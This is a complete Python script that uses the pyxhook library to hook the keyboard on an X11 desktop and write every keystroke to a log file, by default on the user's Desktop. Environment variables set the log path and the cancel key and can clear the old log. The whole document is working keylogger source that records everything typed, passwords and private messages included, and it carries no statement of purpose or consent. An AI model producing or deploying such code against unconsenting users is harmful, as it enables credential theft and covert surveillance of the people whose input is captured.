#!/usr/bin/python3
import os
import pyxhook


def main():
    log_file = os.environ.get(
        'pyLogger_file',
        os.path.expanduser('~/Desktop/file.log')
    )

    cancel_key = ord(
        os.environ.get(
            'pyLogger_cancel',
            '`'
        )[0]
    )

    if os.environ.get('pylogger_clean', None) is not None:
        try:
            os.remove(log_file)
        except EnvironmentError:
            pass

    def onKeyPress(event):
        with open(log_file, 'a') as f:
            f.write('{}\n'.format(event.Key))

    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = onKeyPress
    new_hook.HookKeyboard()
    try:
        new_hook.start()
    except KeyboardInterrupt:
        pass
    except Exception as ex:
        msg = 'Error while catching events:\n  {}'.format(ex)
        pyxhook.print_err(msg)
        with open(log_file, 'a') as f:
            f.write('\n{}'.format(msg))


if __name__ == '__main__':
    main()
